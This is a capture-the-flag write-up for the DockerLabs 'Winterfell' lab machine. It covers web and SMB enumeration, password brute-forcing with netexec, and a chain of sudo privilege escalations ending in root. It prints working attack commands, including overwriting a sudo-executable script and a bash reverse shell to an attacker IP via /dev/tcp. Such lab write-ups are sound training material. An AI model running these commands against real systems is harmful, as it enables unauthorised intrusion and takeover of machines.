# Winterfell - DockerLabs - Easy

## Summary

**Winterfell** is an easy Linux machine from DockerLabs themed around *Game of Thrones*. The attack path involves web enumeration to discover a wordlist of GoT episode names, SMB enumeration to find credentials, and a chain of lateral movement across three users (jon → aria → daenerys) using sudo misconfigurations before achieving root by overwriting a shell script executable as root via NOPASSWD.

---

## Tools

- `nmap` — port and service enumeration
- `gobuster` — web directory/file brute force
- `smbclient` — SMB share access
- `netexec` — SMB credential brute force (SMBv2)
- `enum4linux` — SMB user enumeration
- `netcat (nc)` — reverse shell listener

---

## 1. Enumeration

### Port Scan

```bash
nmap -sV -sC -p- 172.17.0.2
```

Open ports:
- **22** — SSH (OpenSSH 9.2p1)
- **80** — HTTP (Apache 2.4.61)
- **139 / 445** — Samba SMBv2

### Web Enumeration

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
```

Key finding:
- `/dragon/` — directory with GoT-themed content

Browsing to `http://172.17.0.2/dragon/EpisodiosT1` revealed a list of Game of Thrones Season 1 episode names (without spaces), which served as a custom wordlist:

```
seacercaelinvierno
elcaminoreal
lordnieve
tullidosbastardosycosasrotas
elloboyelleon
unacoronadeoro
ganasomueres
porelladodelapunta
baelor
fuegoyhielo
```

### SMB Enumeration

```bash
smbclient -L //172.17.0.2 -N
```

Shares found:
- `shared` — accessible share (required credentials)

### SMB Credential Brute Force

Hydra fails on SMBv2, so `netexec` was used instead:

```bash
netexec smb 172.17.0.2 -u jon -p ~/winterfell/dragon.txt
```

**Result:** `jon : seacercaelinvierno`

### SMB Share Access

```bash
smbclient //172.17.0.2/shared -U jon%seacercaelinvierno
smb: \> get proteccion_del_reino
```

Contents of `proteccion_del_reino`:

```
Aria de ti depende que los caminantes blancos no consigan pasar el muro.
Esta es mi contraseña, se encuentra cifrada en ese lenguaje y es -> aGlqb2RlbGFuaXN0ZXI=
```

Decoded from Base64:
```bash
echo "aGlqb2RlbGFuaXN0ZXI=" | base64 -d
# hijodelanister
```

## 2. Exploitation

### SSH Access as jon

The decoded password `hijodelanister` works for `jon` (not `aria`):

```bash
ssh jon@172.17.0.2
# password: hijodelanister
```

In `jon`'s home directory, a hidden Python script `.mensaje.py` was found — owned by `aria` but with group write permissions. `sudo -l` revealed:

```
(aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py
```

---

## 3. Escalate Privileges

### jon → aria (Python script overwrite)

Since `jon` owns the home directory, the file can be deleted and recreated:

```bash
rm -f /home/jon/.mensaje.py
echo 'import os; os.system("/bin/bash")' > /home/jon/.mensaje.py
sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
```

Shell obtained as `aria`.

### aria → daenerys (sudo cat/ls)

```bash
sudo -l
# (daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls
```

```bash
sudo -u daenerys /usr/bin/ls /home/daenerys/
sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon
```

File revealed daenerys' password: `!drakaris!`

```bash
su daenerys
# password: !drakaris!
```

### daenerys → root (shell script overwrite)

In `/home/daenerys/.secret/.shell.sh` a reverse shell script was found. `sudo -l` revealed:

```
(ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

The script was overwritten with the attacker's IP:

```bash
echo '#!/bin/bash' > /home/daenerys/.secret/.shell.sh
echo 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1' >> /home/daenerys/.secret/.shell.sh
```

Listener started on attacker machine:

```bash
nc -lvnp 443
```

Executed as root:

```bash
sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

**Root shell obtained.**

---

## 4. Lessons Learned

1. **Web content can serve as a wordlist** — episode names without spaces were used directly as passwords.
2. **SMBv2 requires modern tools** — Hydra fails on SMBv2; use `netexec` or `crackmapexec` instead.
3. **Base64 is not encryption** — encoded strings in files are always worth decoding.
4. **Directory ownership matters more than file permissions** — `jon` couldn't write to `aria`'s file, but could delete and recreate it because he owned the directory.
5. **Chained sudo privesc** — each user had NOPASSWD sudo to the next user, creating a full lateral movement chain: `jon → aria → daenerys → root`.
6. **Writable scripts in sudo rules = instant escalation** — if a user can modify a script that another can execute via sudo, it's game over.
